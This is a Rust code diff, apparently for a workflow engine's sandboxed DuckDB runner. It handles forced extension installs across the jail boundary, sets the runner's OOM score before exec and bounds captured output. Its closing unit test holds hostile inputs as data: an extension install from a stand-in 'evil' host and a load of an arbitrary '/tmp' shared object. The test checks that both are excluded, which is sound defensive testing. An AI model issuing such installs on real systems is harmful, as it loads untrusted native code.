@@ -12,7 +12,10 @@ use std::{
 };
 
 use serde::Serialize;
-use tokio::{io::AsyncWriteExt, process::Command};
+use tokio::{
+    io::{AsyncRead, AsyncReadExt, AsyncWriteExt},
+    process::Command,
+};
 use windmill_common::error::{Error, Result};
 
 use crate::{
@@ -92,7 +95,7 @@ pub(crate) fn keeps_fence(mode: Option<RunnerMode>) -> bool {
     mode != Some(RunnerMode::Jailed) || *FENCE_IN_JAIL
 }
 
-#[derive(Serialize)]
+#[derive(Serialize, Clone, Copy)]
 #[serde(rename_all = "snake_case")]
 pub(crate) enum RequestMode {
     Run,
@@ -100,7 +103,7 @@ pub(crate) enum RequestMode {
     Install,
 }
 
-#[derive(Serialize)]
+#[derive(Serialize, Clone, Copy)]
 pub(crate) struct RunnerRequest<'a> {
     pub mode: RequestMode,
     pub blocks: &'a [String],
@@ -146,7 +149,8 @@ fn extension_dir() -> String {
 
 /// Extensions a job may load inside the jail, where the cache is read-only: the two
 /// `setup_duckdb_connection` installs on every connection, the fence's preloads, and every
-/// extension a block installs by name.
+/// extension a block installs by name. A `FORCE INSTALL` stays forced: it is the one
+/// statement here that must run every time.
 fn needed_extensions(blocks: &[String]) -> Vec<String> {
     let mut out: Vec<String> = ["httpfs", "azure", "parquet", "json"]
         .iter()
@@ -155,7 +159,8 @@ fn needed_extensions(blocks: &[String]) -> Vec<String> {
     for block in blocks {
         let stmt = block.trim().trim_end_matches(';').trim();
         let mut toks = stmt.split_whitespace().peekable();
-        if toks.peek().is_some_and(|t| t.eq_ignore_ascii_case("FORCE")) {
+        let force = toks.peek().is_some_and(|t| t.eq_ignore_ascii_case("FORCE"));
+        if force {
             toks.next();
         }
         if !toks
@@ -169,12 +174,13 @@ fn needed_extensions(blocks: &[String]) -> Vec<String> {
             continue;
         }
         let name = name.to_ascii_lowercase();
+        let force = if force { "FORCE " } else { "" };
         let stmt = match (toks.next(), toks.next(), toks.next()) {
-            (None, _, _) => format!("INSTALL {name};"),
+            (None, _, _) => format!("{force}INSTALL {name};"),
             (Some(f), Some(r), None)
                 if f.eq_ignore_ascii_case("FROM") && r.eq_ignore_ascii_case("community") =>
             {
-                format!("INSTALL {name} FROM community;")
+                format!("{force}INSTALL {name} FROM community;")
             }
             _ => continue,
         };
@@ -195,7 +201,7 @@ async fn install_missing_extensions(blocks: &[String], job_dir: &str) -> Result<
         let installed = INSTALLED.lock().unwrap();
         needed_extensions(blocks)
             .into_iter()
-            .filter(|s| !installed.contains(s))
+            .filter(|s| s.starts_with("FORCE ") || !installed.contains(s))
             .collect()
     };
     if missing.is_empty() {
@@ -226,8 +232,32 @@ async fn install_missing_extensions(blocks: &[String], job_dir: &str) -> Result<
             out.result
         )));
     }
-    INSTALLED.lock().unwrap().extend(missing);
+    INSTALLED.lock().unwrap().extend(missing.into_iter().filter(|s| !s.starts_with("FORCE ")));
     Ok(())
+}
+
+/// `FORCE INSTALL` rewrites the cache, which is read-only inside the jail. The worker has
+/// already honored it outside, so inside it becomes a plain `INSTALL`, which finds the
+/// extension present and does nothing. Same block count, so result collection is unchanged.
+fn unforce_installs(blocks: &[String]) -> Vec<String> {
+    blocks
+        .iter()
+        .map(|b| {
+            let t = b.trim_start();
+            match t.split_once(char::is_whitespace) {
+                Some((first, rest))
+                    if first.eq_ignore_ascii_case("FORCE")
+                        && rest
+                            .trim_start()
+                            .get(..7)
+                            .is_some_and(|k| k.eq_ignore_ascii_case("INSTALL")) =>
+                {
+                    rest.trim_start().to_string()
+                }
+                _ => b.clone(),
+            }
+        })
+        .collect()
 }
 
 pub(crate) async fn run(
@@ -235,10 +265,12 @@ pub(crate) async fn run(
     req: &RunnerRequest<'_>,
     job_dir: &str,
 ) -> Result<RunnerOutput> {
-    if mode == RunnerMode::Jailed {
-        install_missing_extensions(req.blocks, job_dir).await?;
+    if mode != RunnerMode::Jailed {
+        return spawn_runner(mode, req, job_dir, keeps_fence(Some(mode))).await;
     }
-    spawn_runner(mode, req, job_dir, keeps_fence(Some(mode))).await
+    install_missing_extensions(req.blocks, job_dir).await?;
+    let blocks = unforce_installs(req.blocks);
+    spawn_runner(mode, &RunnerRequest { blocks: &blocks, ..*req }, job_dir, keeps_fence(Some(mode))).await
 }
 
 async fn spawn_runner(
@@ -324,48 +356,48 @@ async fn spawn_runner(
     payload["lock_temp_directory"] = serde_json::Value::Bool(lock_temp_directory);
     let payload = serde_json::to_vec(&payload).map_err(|e| Error::InternalErr(e.to_string()))?;
 
+    // The engine's memory lives outside the worker, so a native OOM can take the job alone, as
+    // long as the kernel picks the runner first. Set before exec so nsjail, and the runner it
+    // clones, inherit it: written after spawn it races the clone, and the jail's /proc is
+    // read-only. Only raw syscalls here, between fork and exec.
+    #[cfg(target_os = "linux")]
+    {
+        let adj = windmill_common::worker::JOB_OOM_SCORE_ADJ.to_string();
+        unsafe {
+            cmd.pre_exec(move || {
+                let fd = nix::libc::open(c"/proc/self/oom_score_adj".as_ptr(), nix::libc::O_WRONLY);
+                if fd >= 0 {
+                    nix::libc::write(fd, adj.as_ptr().cast(), adj.len());
+                    nix::libc::close(fd);
+                }
+                Ok(())
+            });
+        }
+    }
     let mut child = cmd.spawn().map_err(|e| {
         Error::InternalErr(format!("Could not start the DuckDB runner ({mode:?}): {e}"))
     })?;
-    // The engine's memory now lives outside the worker, so a native OOM can take the job
-    // alone, as long as the kernel picks the runner first.
-    #[cfg(target_os = "linux")]
-    if let Some(pid) = child.id() {
-        let adj = *windmill_common::worker::JOB_OOM_SCORE_ADJ;
-        if let Err(e) = std::fs::write(format!("/proc/{pid}/oom_score_adj"), adj.to_string()) {
-            tracing::error!("Failed to set oom_score_adj={adj} for the DuckDB runner {pid}: {e:#}");
-        }
-    }
-
     let mut stdin = child.stdin.take().expect("stdin is piped");
     let write = async move {
         stdin.write_all(&payload).await?;
         stdin.shutdown().await
     };
-    let (write, output) = tokio::join!(write, child.wait_with_output());
-    let output = output?;
-
-    let stderr = String::from_utf8_lossy(&output.stderr);
-    let stdout = String::from_utf8_lossy(&output.stdout);
+    let stdout = child.stdout.take().expect("stdout is piped");
+    let stderr = child.stderr.take().expect("stderr is piped");
+    let (write, status, stdout, stderr) =
+        tokio::join!(write, child.wait(), output_tail(stdout), output_tail(stderr));
+    let status = status?;
     let read = tokio::fs::read_to_string(&result_path).await;
     let _ = tokio::fs::remove_file(&result_path).await;
 
-    if !output.status.success() || read.is_err() {
+    if !status.success() || read.is_err() {
         #[cfg(unix)]
-        let signal = std::os::unix::process::ExitStatusExt::signal(&output.status);
+        let signal = std::os::unix::process::ExitStatusExt::signal(&status);
         #[cfg(not(unix))]
         let signal: Option<i32> = None;
         let how = match signal {
             Some(sig) => format!("was killed by signal {sig}"),
-            None => format!("exited with {}", output.status),
-        };
-        let tail = |s: &str| {
-            let s = s.trim();
-            let mut start = s.len().saturating_sub(2000);
-            while !s.is_char_boundary(start) {
-                start += 1;
-            }
-            s[start..].to_string()
+            None => format!("exited with {status}"),
         };
         return Err(Error::ExecutionErr(format!(
             "The DuckDB engine process {how}. The worker is unaffected.{}{}{}",
@@ -376,12 +408,12 @@ async fn spawn_runner(
             if stderr.trim().is_empty() {
                 String::new()
             } else {
-                format!("\nstderr: {}", tail(&stderr))
+                format!("\nstderr: {}", stderr.trim())
             },
             if stdout.trim().is_empty() {
                 String::new()
             } else {
-                format!("\nstdout: {}", tail(&stdout))
+                format!("\nstdout: {}", stdout.trim())
             },
         )));
     }
@@ -390,4 +422,59 @@ async fn spawn_runner(
     let result = column_order.split_off((header_end + 1).min(column_order.len()));
     column_order.truncate(header_end);
     Ok(RunnerOutput { column_order: (!column_order.is_empty()).then_some(column_order), result })
+}
+
+/// Drains a runner pipe keeping only its last few KB. A script controls how much the engine
+/// prints (`CALL enable_logging(storage='stdout')`), so buffering it whole would let a jailed
+/// job grow the worker's memory without bound.
+async fn output_tail(mut r: impl AsyncRead + Unpin) -> String {
+    const KEEP: usize = 4096;
+    let mut buf = vec![0u8; 16 * 1024];
+    let mut tail: Vec<u8> = Vec::with_capacity(2 * KEEP);
+    loop {
+        match r.read(&mut buf).await {
+            Ok(0) | Err(_) => break,
+            Ok(n) => {
+                tail.extend_from_slice(&buf[..n]);
+                if tail.len() > KEEP {
+                    tail.drain(..tail.len() - KEEP);
+                }
+            }
+        }
+    }
+    String::from_utf8_lossy(&tail).into_owned()
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn strs(v: &[&str]) -> Vec<String> {
+        v.iter().map(|s| s.to_string()).collect()
+    }
+
+    #[test]
+    fn force_installs_run_outside_and_become_plain_inside() {
+        let blocks = strs(&[
+            "force  install httpfs;",
+            "INSTALL bigquery FROM community;",
+            "INSTALL x FROM 'http://evil';",
+            "INSTALL '/tmp/x.so';",
+            "SELECT 'FORCE INSTALL';",
+        ]);
+        assert_eq!(
+            needed_extensions(&blocks)[4..],
+            strs(&["FORCE INSTALL httpfs;", "INSTALL bigquery FROM community;"])
+        );
+        assert_eq!(
+            unforce_installs(&blocks),
+            strs(&[
+                "install httpfs;",
+                "INSTALL bigquery FROM community;",
+                "INSTALL x FROM 'http://evil';",
+                "INSTALL '/tmp/x.so';",
+                "SELECT 'FORCE INSTALL';",
+            ])
+        );
+    }
 }
